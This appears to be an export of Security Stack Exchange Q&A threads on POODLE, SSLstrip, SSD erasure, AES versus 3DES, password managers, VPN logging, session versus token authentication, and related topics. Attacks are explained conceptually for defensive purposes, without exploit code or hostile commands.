<p>Brute force, unless you know a lot about the password and it's incredibly stupid (i.e. you know for certain it's an 8 character set of numbers) is going to be a non-starter.</p>

<p>Don't forget, strictly speaking there ""shouldn't"" be a way to break the password, so if none of these options seem viable, it just means you've got decent security. There may not be an answer as to how you can do it. </p>
","35279"
"SSL3 ""POODLE"" Vulnerability","104627","","<blockquote>
  <p><em>Canonical question regarding the recently disclosed padding oracle vulnerability in SSL v3. Other identical or significantly similar questions should be closed as a duplicate of this one.</em></p>
</blockquote>

<ul>
<li>What is the POODLE vulnerability? </li>
<li>I use [<code>product</code>/<code>browser</code>]. Am I affected?</li>
<li>Is [<code>product</code>] vulnerable to the POODLE attack?</li>
<li>What do I need to do to secure my [<code>product</code>] with respect to this vulnerability?</li>
<li>How do I detect POODLE attacks on my network?</li>
<li>Are there any known POODLE attacks?</li>
</ul>

<p>References:</p>

<ul>
<li><a href=""http://googleonlinesecurity.blogspot.com/2014/10/this-poodle-bites-exploiting-ssl-30.html"">Google security announcement</a></li>
<li><a href=""https://www.openssl.org/~bodo/ssl-poodle.pdf"">POODLE Whitepaper (PDF)</a></li>
</ul>
","<h2>What is the Poodle vulnerability ?</h2>

<p>The ""Poodle"" vulnerability, <a href=""http://googleonlinesecurity.blogspot.ie/2014/10/this-poodle-bites-exploiting-ssl-30.html"">released on October 14th, 2014</a>, is an attack on the SSL 3.0 protocol. It is a <em>protocol</em> flaw, not an implementation issue; every implementation of SSL 3.0 suffers from it. Please note that we are talking about the old SSL 3.0, <em>not</em> TLS 1.0 or later. The TLS versions are not affected (neither is DTLS).</p>

<p><strong>In a nutshell:</strong> when SSL 3.0 uses a block cipher in CBC mode, the encryption process for a record uses <em>padding</em> so that the data length is a multiple of the block size. For instance, suppose that 3DES is used, with 8-byte blocks. A <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">MAC</a> is computed over the record data (and the record sequence number, and some other header data) and appended to the data. Then 1 to 8 bytes are appended, so that the total length is a multiple of 8. Moreover, if <em>n</em> bytes are added at that step, then the last of these bytes must have value <em>n-1</em>. This is made so that decryption works.</p>

<p>Consider the decryption of a record: 3DES-CBC decryption is applied, then the very last byte is inspected: it should contain a value between 0 and 7, and that tells us how many other bytes were added for padding. These bytes are removed, and, crucially, <em>their contents are ignored</em>. This is the important point: there are bytes in the record that can be changed without the recipient minding in the slightest way.</p>

<p>The Poodle attack works in a chosen-plaintext context, like BEAST and CRIME before it. The attacker is interested in data that gets protected with SSL, and he can:</p>

<ul>
<li>inject data of their own before and after the secret value that he wants to obtain;</li>
<li>inspect, intercept and modify the resulting bytes on the wire.</li>
</ul>

<p>The main and about only plausible scenario where such conditions are met is a Web context: the attacker runs a fake WiFi access point, and injects some Javascript of their own as part of a Web page (HTTP, not HTTPS) that the victim browses. The evil Javascript makes the browser send requests to a HTTPS site (say, a bank Web site) for which the victim's browser has a <em>cookie</em>. The attacker wants that cookie.</p>

<p>The attack proceeds byte-by-byte. The attacker's Javascript arranges for the request to be such that the last cookie byte occurs at the end of an encryption block (one of the 8-byte blocks of 3DES) and such that the total request length implies a full-block padding. Suppose that the last 8 cookie bytes have values <em>c<sub>0</sub></em>, <em>c<sub>1</sub></em>, ... <em>c<sub>7</sub></em>. Upon encryption, CBC works like this:</p>

<p><img src=""https://i.stack.imgur.com/2mu7N.png"" alt=""CBC encryption, from Wikipedia""></p>

<p>So if the previous encrypted block is <em>e<sub>0</sub></em>, <em>e<sub>1</sub></em>, ... <em>e<sub>7</sub></em>, then what enters 3DES is <em>c<sub>0</sub></em> XOR <em>e<sub>0</sub></em>, <em>c<sub>1</sub></em> XOR <em>e<sub>1</sub></em>, ... <em>c<sub>7</sub></em> XOR <em>e<sub>7</sub></em>. The <em>e<sub>i</sub></em> values are known to the attacker (that's the encrypted result).</p>

<p>Then, the attacker, from the outside, replaces the last block of the encrypted record with a copy of the block that contains the last cookie byte. To understand what happens, you have to know how CBC decryption works:</p>

<p><img src=""https://i.stack.imgur.com/jXp19.png"" alt=""CBC decryption (from Wikipedia)""></p>

<p>The last ciphertext block thus gets decrypted, which yields a value ending with <em>c<sub>7</sub></em> XOR <em>e<sub>7</sub></em>. That value is then XORed with the previous encrypted block. If the result ends with a byte of value 7 (that works with probability 1/256), then the padding removal step will remove the last 8 bytes, and end up with the intact cleartext and MAC, and the server will be content. Otherwise, either the last byte will not be in the 0..7 range, and the server will complain, or the last byte will be between 0 and 6, and the server will remove the wrong number of bytes, and the MAC will not match, and the server will complain. In other words, the attacker can observe the server's reaction to know whether the CBC decryption result found a 7, or something else. When a 7 is obtained, the last cookie byte is immediately revealed.</p>

<p>When the last cookie byte is obtained, the process is executed again with the previous byte, and so on.</p>

<p><strong>The core point</strong> is that SSL 3.0 is defined as <em>ignoring</em> the padding bytes (except the last). These bytes are not covered by the MAC and don't have any defined value.</p>

<p><strong>TLS 1.0 is not vulnerable</strong> because in TLS 1.0, the protocol specifies that <em>all</em> padding bytes must have the same value, and libraries implementing TLS verify that these bytes have the expected values. Thus, our attacker cannot get lucky with probability 1/256 (2<sup>-8</sup>), but with probability 1/18446744073709551616 (2<sup>-64</sup>), which is substantially worse.</p>

<hr />

<h2>I use <code>[product]</code>. Am I affected? Is <code>[product]</code> vulnerable to the Poodle attack ?</h2>

<p>The attack scenario requires the attacker to be able to inject data of their own, <em>and</em> to intercept the encrypted bytes. The only plausible context where such a thing happens is a Web browser, as explained above. In that case, Poodle is, like BEAST and CRIME, an attack on the <em>client</em>, not on the server.</p>

<p>If <code>[product]</code> is a Web browser, then you may be affected. But that also depends on the server. The protocol version used is a negotiation between client and server; SSL 3.0 will happen only if the server agrees. Thus, you <em>might</em> consider that your server is ""vulnerable"" if it allows SSL 3.0 to be used (this is technically incorrect, since the attack is client-side in a Web context, but I expect SSL-security-meters to work that way).</p>

<p>Conditions for the vulnerability to occur: SSL 3.0 supported, <em>and</em> selection of a CBC-based cipher suite (RC4 encryption has no padding, thus is not vulnerable to that specific attack -- but RC4 has other issues, of course).</p>

<p>Workarounds:</p>

<ul>
<li>Disable SSL 3.0 support in the client.</li>
<li>Disable SSL 3.0 support in the server.</li>
<li>Disable support for CBC-based cipher suites when using SSL 3.0 (in either client or server).</li>
<li>Implement <a href=""https://tools.ietf.org/html/draft-ietf-tls-downgrade-scsv-00"">that new SSL/TLS extension</a> to detect when some active attacker is breaking connections to force your client and server to use SSL 3.0, even though both know TLS 1.0 or better. Both client and server must implement it.</li>
</ul>

<p>Any of these four solutions avoids the vulnerability.</p>

<hr />

<h2>What do I need to do to secure my <code>[product]</code> with respect to this vulnerability?</h2>

<p>Same as always. Your vendor publishes security fixes; <em>install them</em>. Install the patches. All the patches. Do that. For Poodle and for all other vulnerabilities. You cannot afford not to install them, and <em>that is not new</em>. You should already be doing that. If you do not install the patches then Níðhöggr will devour your spleen.</p>

<hr />

<h2>How do I detect Poodle attacks on my network?</h2>

<p>You don't ! Since the most probable attack setup involves the attacker luring the victim on <em>their</em> network, not yours.</p>

<p>Although, on the server side, you may want to react on an inordinate amount of requests that fail on a decryption error. Not all server software will log events for such cases, but this should be within the possibilities of any decent IDS system.</p>

<hr />

<h2>Are there any known Poodle attacks?</h2>

<p>Not to my knowledge. In fact, when you control all the external I/O of the victim, it is still considerably easier to simply lure the poor sod on a fake copy of their bank site. Cryptographic attacks are neat, but they involve more effort than exploiting the bottomless well of user's gullibility.</p>
","70724"
"How does SSLstrip work?","103496","","<p>I've been reading up on SSLstrip and I'm not 100% sure on my understanding of how it works. </p>

<p>A lot of documentation seems to indicate that it simply replaces occurrences of ""https"" with ""http"" in traffic that it has access to. So a URL passing through such as ""<a href=""https://twitter.com"">https://twitter.com</a>"" would be passed on the to victim as ""<a href=""http://twitter.com"">http://twitter.com</a>"". </p>

<p>At this point does SSLstrip continue to communicate with Twitter via HTTPS on our behalf? Something like this:</p>

<pre><code>Victim  &lt;== HTTP ==&gt;  Attacker  &lt;== HTTPS ==&gt;  Twitter
</code></pre>

<p>Or is it just the fact that the client is now communicating with Twitter over HTTP that gives us access to the traffic?</p>

<pre><code>Victim  &lt;== HTTP ==&gt;  Attacker  &lt;== HTTP ==&gt;  Twitter
</code></pre>

<p>My guess is it would be the first option where the Attacker continues to communicate with Twitter via HTTPS as it is enforced by Twitter but I would just like some clarification, thanks.</p>
","<p>You should watch Moxie Marlinspike's talk <a href=""https://www.youtube.com/watch?v=MFol6IMbZ7Y"">Defeating SSL using SSLStrip</a>.  In short SSLStrip is a type of MITM attack that forces a victim's browser into communicating with an adversary in plain-text over HTTP, and the adversary proxies the modified content from an HTTPS server.  To do this,  SSLStrip is ""stripping""  <code>https://</code> URLs and turning them into <code>http://</code> URLs.</p>

<p><a href=""http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"">HSTS</a> is a proposed solution to this problem. </p>
","41991"
"Can wiped SSD data be recovered?","103124","","<p>I was reading another post on destroying IDE drives, and how you could remove data, wipe it, or just destroy the drive. The removed data would still be there in some state, although not easily reachable without software. Wiped data is just removed data, but it has been overwritten and is essentially gone. A destroyed disk, if done well enough, will remove everything, or make it nearly impossible to recover anything. (These are from my understandings)</p>

<p>What about a solid state drive? Can the data on one of these be recovered once deleted? It seems that this would be the way to go if you constantly dealt with and removed sensitive data, but they only have so long of a life span (As I understand, again =p). So can data from a SSD be recovered in any way once it is removed, even if it has not been overwritten?</p>
","<p>Yes.  If you do a normal format, the old data can be recovered.  A normal format only deletes/overwrites a tiny bit of filesystem metadata, but does not overwrite all of the data itself.  The data is still there.  This is especially true on SSDs, due to wear levelling and other features of SSDs.</p>

<p>The following research paper studies erasure of data on SSDs:</p>

<ul>
<li>Michael Wei, Laura M. Grupp, Frederick E. Spada, and Steven Swanson.  <a href=""http://www.usenix.org/events/fast11/tech/full_papers/Wei.pdf"" rel=""nofollow noreferrer"">Reliably Erasing Data From Flash-Based Solid State Drives</a>.  USENIX Conference on File and Storage Technologies, 2011.</li>
</ul>

<p>One takeaway lesson is that securely erasing data on a SSD is a bit tricky.  One reason is that overwriting data on a SSD doesn't work the way you'd think it does, due to wear-leveling and other features.  When you ask the SSD to ""overwrite"" an existing sector, it doesn't actually overwrite or delete the existing data immediately.  Instead, it writes the new data somewhere else and just change a pointer to point to the new version (leaving the old version laying around).  The old version may eventually get erased, or it may not.  As a result, even data you think you have erased, may still be present and accessible on the SSD.</p>

<p>Also, SSDs are a bit tricky to sanitize (erase completely), because the methods that used to work for magnetic HDDs don't necessarily work reliably on SSDs (due to the aforementioned wear levelling and other issues).  Consequently, utilities that are advertised as providing ""secure drive erase"" functionality may not be fully secure, if applied to a SSD.  For instance, the FAST paper found that, in most cases, performing a full overwrite of all of the data on the SSD twice was enough to sanitize the disk drive, but there were a few exceptional cases where some of the data still remained present.  There may be other reasons not to want to perform repeated overwrites of the full drive: it is very slow, and it may reduce the subsequent lifetime of the drive.</p>

<p>The FAST paper also found that degaussing (a standard method used for sanitizing magnetic hard drives) is not effective at all at sanitizing SSDs.</p>

<p>Moreover, the FAST paper found that standard utilities for sanitizing individual files were highly unreliable on SSDs: often a large fraction of the data remained present somewhere on the drive.  Therefore, you should assume there is no reliable way to securely erase individual files on a SSD; you need to sanitize the whole drive, as an entire unit.</p>

<p>The most reliable way to securely erase an entire SSD is to use the ATA Secure Erase command.  However, this is not foolproof.  The FAST paper found that most SSDs implement this correctly, but not all.  In particular, 8 of the 12 SSDs they studied supported ATA Secure Erase, and 4 did not.  Of the 8 that did support it, 3 had a buggy implementation.  1 buggy implementation was really bad: it reported success, but actually left the data laying around.  This is atrociously bad, because there is no way that software could detect the failure to erase.  2 buggy implementations failed and left old data laying around (under certain conditions), but at least they reported failure, so if the software that sends the ATA Secure Erase command checks the result code, at least the failure could be detected.</p>

<p>The other possible approach is to use full disk encryption: make sure the entire filesystem on the drive is encrypted from the start (e.g., Bitlocker, Truecrypt).  When you want to sanitize the drive, forget all the crypto keys and securely erase them, and then erase the drive as best as possible.  This may be a workable solution, though personally I would probably want to combine it with ATA Secure Erase, too, for best security.</p>

<p>See also the following questions on this site:</p>

<ul>
<li><p><a href=""https://security.stackexchange.com/q/5662/971"">Is it enough to only wipe a flash drive once?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/6320/971"">SSD (Flash Memory) security when data is encrypted in place</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/7069/971"">How can files be deleted in a HIPAA-compliant way?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/8514/971"">Have anyone tried to extract the encryption key from a SSD?</a></p></li>
</ul>
","12506"
"Security comparsion of 3DES and AES","102993","","<p>Which one is more secure and least possible to be broken through cryptanalysis AES or 3DES (no matter performance)?</p>

<p>I need to use encryption for my projects to store and secure sensitive information which includes bank accounts, sort codes, and third party data related bank. I am currently considering using 3DES in CFB mode, but I am not very sure if it is the best option and what are other alternatives.</p>

<p>I know the title does not give much idea what the question is about, but I couldn't think of something better.</p>
","<p>Go for AES.</p>

<p><strong>AES</strong> is the successor of DES as standard symmetric encryption algorithm for US federal organizations. AES uses keys of 128, 192 or 256 bits,
although, 128 bit keys provide sufficient strength today. It uses 128 bit blocks, and is efficient in both software and hardware implementations. It was selected through an open competition involving hundreds of cryptographers during several years.</p>

<p><strong>DES</strong> is the previous ""data encryption standard"" from the seventies. Its key size is too short for proper security. The 56 effective bits can be brute-forced, and that has been done more than ten years ago. DES uses 64 bit blocks, which poses some potential issues when encrypting several gigabytes of data with the same key.</p>

<p><strong>3DES</strong> is a way to reuse DES implementations, by chaining three instances of DES with different keys. 3DES is believed to still be secure because it requires 2^112 operations which is not achievable with foreseeable technology. 3DES is very slow especially in software implementations because DES was designed for performance in hardware.</p>

<p>Resources:<br>
<a href=""http://www.differencebetween.net/technology/difference-between-aes-and-3des"">http://www.differencebetween.net/technology/difference-between-aes-and-3des</a>
<a href=""http://www.icommcorp.com/downloads/Comparison%20AES%20vs%203DES.pdf"">http://www.icommcorp.com/downloads/Comparison%20AES%20vs%203DES.pdf</a> (offline, <a href=""http://web.archive.org/web/*/http://www.icommcorp.com/downloads/Comparison%20AES%20vs%203DES.pdf"">still in the Web Archive</a>)</p>
","26181"
"How safe are password managers like LastPass?","102494","","<p>I use LastPass to store and use my passwords, so I do not have duplicate passwords even if I have to register four to five different accounts a day, and the passwords are long.</p>

<p>How safe are password manager services like LastPass? Don't they create a single point of failure? They are very attractive services for hackers. How can I trust the people behind these services and their security mechanisms?
I imagine that a third party (government, company, etc.) would be very easy to 'bribe' and get all of my passwords. </p>

<p>Are there any other solutions that offer similar services with similar ease of use?</p>
","<p>We should distinguish between offline password managers (like <a href=""http://passwordsafe.sourceforge.net/"">Password Safe</a>) and online password managers (like <a href=""https://lastpass.com/"">LastPass</a>).</p>

<p>Offline password managers carry relatively little risk. It is true that the saved passwords are a single point of failure. But then, your computer is a single point of failure too. The most likely cause of a breach is getting malware on your computer. Without a password manager, malware can quietly sit and capture all the passwords you use. With a password manager, it's slightly worse, because once the malware has captured the master password, it gets all your passwords. But then, who cares about the ones you never use? It is theoretically possible that the password manager could be trojaned, or have a back door - but this is true with any software. I feel comfortable trusting widely used password managers, like Password Safe.</p>

<p>Online password managers have the significant benefit that your passwords are available on anyone's computer, but they also carry somewhat more risk. Partly that the online database could be breached (whether by hacking, court order, malicious insider, etc.) Also because LastPass integrates with browsers, it has a larger attack surface, so there could be technical vulnerabilities (which are unlikely with a standalone app like Password Safe).</p>

<p>Now, for most people these risks are acceptable, and I would suggest that the approach of using a password manager like LastPass for most of your passwords is better than using the same password everywhere - which seems to be the main alternative. But I wouldn't store every password in there; make an effort to memorize your most important ones, like online banking.</p>

<p>I know someone who won't use Password Safe and instead has a physical notebook with his passwords in obfuscated form. This notebook is obviously much safer against malware... whether it's at greater risk of loss/theft is an interesting question.</p>
","45173"
"How can you be caught using Private VPN when there's no logs about who you are?","102398","","<p>I know there are 2 services of VPN (free and paid). Normally, free VPNs need money from somewhere and sometimes they can sell your information to any agency that needs it.<br>
Now, if we are talking about a paid VPN where they use encryption and don't keep any logs or information about the user, IP addresses, or what you're doing, <strong>how can a hacker be traceable?</strong> Then, the best hackers who have been caught must have been a free VPN, because they were too cheap to pay 7-10$/month or I'm missing something.</p>

<p>An excerpt from the FAQs of one of these VPN services. They have it in the privacy policy.</p>

<p><img src=""https://i.stack.imgur.com/wSpmv.jpg"" alt=""enter image description here""></p>
","<p><strong><em>Update/Note:</strong> This is not to discourage VPN usage. I personally use one of the providers mentioned below, and I'm very happy with it. The important point is not to have an illusion of being 100% protected by the VPN provider. If you do something bad enough that state actors are after you, the VPN provider aren't going to risk themselves for you. If those coming after you are motivated enough, they'll exert all possible legal (and not so legal) powers they have. Downloading torrents or posting on anarchist forums is probably not motivating enough, but death threats to up-high politicians on the other hand... If there's one thing to take from this post is this: Use common sense.</em></p>

<hr>

<p>I've researched this subject for more than 3 years*: Looking for VPN providers, reading through their Privacy Policy and Legal pages, contacting them, contacting their ISPs when possible, and I've concluded the following:</p>

<p>I was able to find <strong>zero</strong> reputable/trustworthy and publicly-available (free or paid) VPN service provider that:</p>

<ul>
<li><p>Actually doesn't keep usage logs.</p></li>
<li><p>Actually doesn't respond with your personal information when presented with a <a href=""https://en.wikipedia.org/wiki/Subpoena"">subpoena</a>.</p></li>
</ul>

<p>I'm not exaggerating, absolutely none, zero, nada, nula, nulla, ciphr, cifra.</p>

<p>* <sup>Obviously not a dedicated research for 3 years</sup></p>

<p><strong>Update:</strong> Regarding  ""super awesome Swedish VPN service providers"". Swedish service provider obey the <a href=""http://www.pts.se/upload/Documents/EN/The_Electronic_Communications_Act_2003_389.pdf"">'Electronic Communications Act 2003 389'</a>. Sections 5, 6, and 7 under ""Processing of traffic data"" completely protect your privacy, <strong>but</strong> go a little further and read section 8</p>

<blockquote>
  <p>The provisions of Sections 5 to 7 do not apply</p>
  
  <ol>
  <li><p><strong>When an authority or a court needs access to such data</strong> as referred to in Section 5 to resolve disputes.</p></li>
  <li><p>For electronic messages that are conveyed or have been dispatched or ordered to or from a particular address in an electronic
  communications network that is subject to a decision on <strong>secret
  wire-tapping or secret tele-surveillance</strong>.</p></li>
  <li><p>To the extent data as referred to in Section 5 is necessary to <strong>prevent and expose unauthorised use of an electronic communications</strong>
  network or an electronic communications service.</p></li>
  </ol>
</blockquote>

<p>In case the authorities order secret wire-tapping, the service provider shall not disclose information about it</p>

<blockquote>
  <p>Section 19 An operation shall be conducted so a decision on secret
  wire-tapping <strong>and secret tele-surveillance can be implemented and so
  that the implementation is not disclosed</strong>.</p>
</blockquote>

<p><strong>Update 2:</strong> Regarding <a href=""https://torrentfreak.com/vpn-services-that-take-your-anonymity-seriously-2013-edition-130302/"">other highly recommended super anonymous VPN services</a> (I'll go over only the top two)</p>

<p><strong>BTGuard:</strong> You only need to take one look at the Privacy Policy to know that there's something shady going on.</p>

<blockquote>
  <ul>
  <li><p>Before or at the time of <strong>collecting personal information</strong>, we will identify the <strong>purposes</strong> for which information is being collected.</p></li>
  <li><p>We will <strong>collect and use of personal information</strong> solely with the objective of fulfilling those purposes specified by us and for other
  compatible purposes, unless we obtain the consent of the individual
  concerned <strong>or as required by law</strong>.</p></li>
  <li><p>We will only retain personal information as long as necessary for the <strong>fulfillment of those purposes</strong>.</p></li>
  <li><p>We will collect personal information by lawful and fair means <strong>and, where appropriate, with the knowledge or consent of the individual
  concerned</strong>.</p></li>
  </ul>
</blockquote>

<p>You can clearly see the intentionally vague language: ""fulfilling those purposes specified by us"", what are those purposes specified by them? Nobody knows. They even clearly say that they'll collect personal information when required by the law. In the last point they even state that they even don't have to inform you about the collection of your personal information unless it's ""appropriate"".</p>

<p><strong>PrivateInternetAccess:</strong> This is probably one of the easiest legal language in the business.</p>

<blockquote>
  <p>You agree to comply with all applicable laws and regulations in
  connection with use of this service. You must also agree that you nor
  any other user that you have provided access to will not engage in any
  of the following activities:</p>
  
  <ul>
  <li><p>Uploading, possessing, receiving, transporting, or distributing any copyrighted, trademark, or patented content which you do not own or
  lack written consent or a license from the copyright owner.</p></li>
  <li><p>Accessing data, systems or networks including attempts to probe scan or test for vulnerabilities of a system or network or to breach
  security or authentication measures without written consent from the
  owner of the system or network.</p></li>
  <li><p>Accessing the service to violate any laws at the local, state and federal level in the United States of America or the country/territory
  in which you reside.</p></li>
  </ul>
</blockquote>

<p>If you break any of their conduct conditions (mentioned above)</p>

<blockquote>
  <p>Failure to comply with the present Terms of Service constitutes a
  material breach of the Agreement, and may result in one or more of
  these following actions:</p>
  
  <ul>
  <li>Issuance of a warning;</li>
  <li>Immediate, temporary, or permanent revocation of access to Privateinternetaccess.com with no refund;</li>
  <li>Legal actions against you for reimbursement of any costs incurred via indemnity resulting from a breach;</li>
  <li>Independent legal action by Privateinternetaccess.com as a result of a breach; or</li>
  <li><strong>Disclosure of such information to law enforcement authorities</strong> as deemed reasonably necessary.</li>
  </ul>
</blockquote>
","39798"
"Session Authentication vs Token Authentication","101372","","<p>I am trying to get a handle on some terms and mechanisms and find out how they relate to each other or how they overlap. Authenticating a theoretical web application and mobile application is the focus. <strong>The focus is on the exact difference between token based authentication and cookie based authentication and if/how they intersect.</strong> </p>

<p><em>http basic/digest and complex systems like oauth/aws auth do not interest me</em></p>

<p>I have a few assertions which I would like to put out there and see if they are correct.</p>

<ol>
<li>Only using authentication tokens without sessions is possible in mobile applications. In a browser context you need cookies to persist the tokens clientside.</li>
<li>You exchange your credentials (usually username/pw) for a token wich can be limited in scope and time. But this also means that the token and everything relating to it must be persisted and handled by the server as well.</li>
<li>Tokens can be revoked serverside. Cookies do not have that option and will/ should expire.</li>
<li>Using only cookies means that sessionid is related to the user account and not limited in any way.</li>
</ol>

<p>I am hoping i am not too far off the mark and am thankful for any help!</p>
","<ol>
<li><p>In <strong>Session-based Authentication</strong> the Server does all the heavy lifting server-side. Broadly speaking a client authenticates with its credentials and receives a session_id (which can be stored in a cookie) and attaches this to every subsequent outgoing request. So this could be considered a ""token"" as it is the equivalent of a set of credentials. There is however nothing fancy about this session_id-String. It is just an identifier and the server does everything else. It is stateful. It associates the identifier with a user account (e.g. in memory or in a database). It can restrict or limit this session to certain operations or a certain time period and can invalidate it if there are security concern and more importantly it can do and change all of this on the fly. Furthermore it can log the users every move on the website(s). Possible disadvantages are bad scale-ability (especially over more than one server farm) and extensive memory usage.</p></li>
<li><p>In <strong>Token-based Authentication</strong> no session is persisted server-side (stateless). The initial steps are the same. Credentials are exchanged against a token which is then attached to every subsequent request (It can also be stored in a cookie). However for the purpose of decreasing memory usage, easy scale-ability and total flexibility (tokens can be exchanged with another client) a string with all the necessary information is issued (the token) which is checked after each request made by the client to the server. There are a number of ways to use/ create tokens:</p></li>
</ol>

<p>a) using a hash mechanism e.g. HMAC-SHA1</p>

<pre><code>token = user_id|expiry_date|HMAC(user_id|expiry_date, k)
</code></pre>

<p>--id and expiry_id are sent in plaintext with the resulting hash attached (k is only know to the server)</p>

<p>b) encrypting the token symmetrically e.g. with AES</p>

<pre><code>token = AES(user_id|expiry_date, x)
</code></pre>

<p>--x represents the en-/decryption key</p>

<p>c) encrypting it asymmetrically e.g. with RSA</p>

<pre><code>token = RSA(user_id|expiry_date, private key)
</code></pre>

<p><strong>Productive systems</strong> are usually more complex than those two archetypes. Amazon for example uses both mechanisms on its website. Also hybrids can be used to issue tokens as described in 2 and also associate a user session with it for user tracking or possible revocation and still retain the client flexibility of classic tokens. Also OAuth 2.0 uses short-lived and specific bearer-tokens and longer-lived refresh tokens e.g. to get bearer-tokens.</p>

<p>Sources:</p>

<ul>
<li><a href=""https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"" rel=""noreferrer"">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</a></li>
<li><a href=""https://stackoverflow.com/questions/1283594/securing-cookie-based-authentication"">https://stackoverflow.com/questions/1283594/securing-cookie-based-authentication</a></li>
<li><p><a href=""https://auth0.com/blog/angularjs-authentication-with-cookies-vs-token/"" rel=""noreferrer"">https://auth0.com/blog/angularjs-authentication-with-cookies-vs-token/</a></p></li>
<li><p><a href=""https://security.stackexchange.com/questions/30707/demystifying-web-authentication-stateless-session-cookies"">Demystifying Web Authentication (Stateless Session Cookies)</a></p></li>
<li><a href=""https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication"" rel=""noreferrer"">https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication</a></li>
</ul>
","92123"
"What is the difference in security between a VPN- and a SSL-connection?","100770","","<p>I would like to design a client-server application where the server is placed on Internet. I assume that I could set up the client-server connection using VPN (is it using IPSec?) or using a SSL connection (possibly https). What are the differences between VPN/IPsec and SSL/https for securing a client server connection over Internet? </p>
","<p>VPN means ""Virtual Private Network"". It is a generic concept which designates a part of a bigger network (e.g. the Internet at large) which is logically isolated from the bigger network through non-hardware means (that's what ""virtual"" means): it is not that we are using distinct cables and switches; rather, isolation is performed through use of cryptography.</p>

<p>SSL (now known as TLS) is a technology which takes a bidirectional transport medium and provides a <em>secured</em> bidirectional medium. It requires the underlying transport medium to be ""mostly reliable"" (when not attacked, data bytes are transferred in due order, with no loss and no repetition). SSL provides confidentiality, integrity (active alterations are reliably detected), and some authentication (usually server authentication, possibly mutual client-server authentication if using certificates on both sides).</p>

<p>So VPN and SSL are not from the same level. A VPN <em>implementation</em> requires some cryptography at some point. Some VPN implementations actually use SSL, resulting in a layered system: the VPN transfers IP packets (of the virtual network) by serializing them on a SSL connection, which itself uses TCP as a transport medium, which is built over IP packets (on the physical unprotected network). IPsec is another technology which is more deeply integrated in the packets, which suppresses some of those layers, and is thus a bit more efficient (less bandwidth overhead). On the other hand, IPsec must be managed quite deep within the operating system network code, while a SSL-based VPN only needs some way to hijack incoming and outgoing traffic; the rest can be down in user-level software.</p>

<p>As I understand your question, you have an application where some machines must communicate over the Internet. You have some security requirements, and are thinking about either using SSL (over TCP over IP) or possibly HTTPS (which is HTTP-over-SSL-over-TCP-over-IP), or setting up a VPN between client and server and using ""plain"" TCP in that private network (the point of the VPN is that is gives you a secure network where you need not worry anymore about confidentiality). With SSL, your connection code must be aware of the security; from a programming point of view, you do not open a SSL connection as if it was ""just a socket"". Some libraries make it relatively simple, but still, you must manage security at application level. A VPN, on the other hand, is configured at operating system level, so the security is not between your application on the client and your application on the server, but between the client operating system and the server operating system: that's not the same security model, although in many situations the difference turns out not to be relevant.</p>

<p>In practice, a VPN means that some configuration step is needed on the client operating system. It is quite invasive. Using two VPN-based applications on the same client may be problematic (security-wise, because the client then acts as a bridge which links together two VPN which should nominally be isolated from each other, and also in practice, because of collisions in address space). If the client is a customer, having him configure a VPN properly looks like an impossible task. <em>However</em>, a VPN means that applications need not be aware of security, so this makes it much easier to integrate third-party software within your application.</p>
","1480"
"Spam that comes from names in my address book, but not their email addresses","100297","","<p>I've recently received two spam messages that show a possibly worrying degree of knowledge about my contacts, and I'm wondering how concerned I should be.</p>

<p>Specifically, the names -- but not the email addresses -- that they appear to come from are family members.  They share the same last name as me, but it doesn't appear to be random name guessing -- the only two messages I've received with a sender sharing my last name are real first names of family members (no ""misses"").  <strong><em>Edit:</em></strong> one of the names is fairly common; the other is pretty rare (didn't rank higher than #428 on <a href=""http://www.ssa.gov/oact/babynames/"">http://www.ssa.gov/oact/babynames/</a>), and can be easily discovered by visiting the website linked in my profile.</p>

<p>The messages were addressed to an older email account that I no longer use, but that's still set up to forward to my current address.  This older email address does show up in various google searches alongside my name, but neither of these other two names as far as I can tell.</p>

<p>Given the above, how concerned should I be that <strong><em>my</em></strong> account has been breached -- as opposed to an account belonging to some third party who knows both me and these two family members, and still has my old address in their contact list?</p>

<p><em><strong>Edit 2</em></strong>: I've had 2-factor authentication enabled on my main email (gmail) for some time before this spam began arriving, with no known loss of control of my phone, backup codes, etc.  I will also enable it for Facebook now that that's become available.</p>
","<p>I have noticed SPAM which meets this description, and which I infer is the result of address book compromises of people who have me in their contacts.  For half a dozen of my acquaintances, I began receiving SPAM with the following characteristics:</p>

<ol>
<li>My friend's name (""JOHN WAYNE"") in the From: field, but with a different actual email address, often at yahoo.com (""rikhanis@yahoo.com"")</li>
<li>Subject is my first name, or some simple variation (""GREG"", ""FOR GREG"")</li>
<li>From, To, and Subject often all caps</li>
<li><p>One-line SPAM with links:</p>

<p>greg, hey. look what I found! <a href=""http://www.BAD.kr/bbs/data/bearangerchristophergordon/"">http://www.BAD.kr/bbs/data/bearangerchristophergordon/</a></p>

<p>GREG, HI. YOU NEED TO VISIT THIS <a href=""http://www.BAD.com/babyelementmarkphillips/"">http://www.BAD.com/babyelementmarkphillips/</a></p>

<p>hey greg <a href=""http://BAD.net/diagramcyclingtimothymurphy/"">http://BAD.net/diagramcyclingtimothymurphy/</a></p></li>
</ol>

<p>None of the friends who were named in these messages could find anything with antivirus... but none of them were technically competent, either.  However, given the ongoing repetition of SPAM with their names but different email addresses, I'm concluding their address book got compromised and the spambots are using that to tailor the SPAM.</p>
","34560"
"Can the Gmail password be recovered from the Android Gmail app?","100055","","<p>I have an Android device with the Gmail app installed. This app can access the mailbox so there must be some kind of authentication data stored on the device (possibly an application specific password?).</p>

<p>Is there a way to use the installed Gmail app to recover/reset the password for the associated Google account or set the security question/phone number associated with it?</p>

<p>More generally, does the Gmail app provide full control over the account, or does it allow only to receive and send emails through the account?</p>
","<p>There is some information on <a href=""http://lwn.net/Articles/453892/"">this page</a> and you can read <a href=""https://code.google.com/p/android/issues/detail?id=10809"">that page too</a> if you like the zoo-like ambiance of finding a few gems of information amid all the monkey screaming.</p>

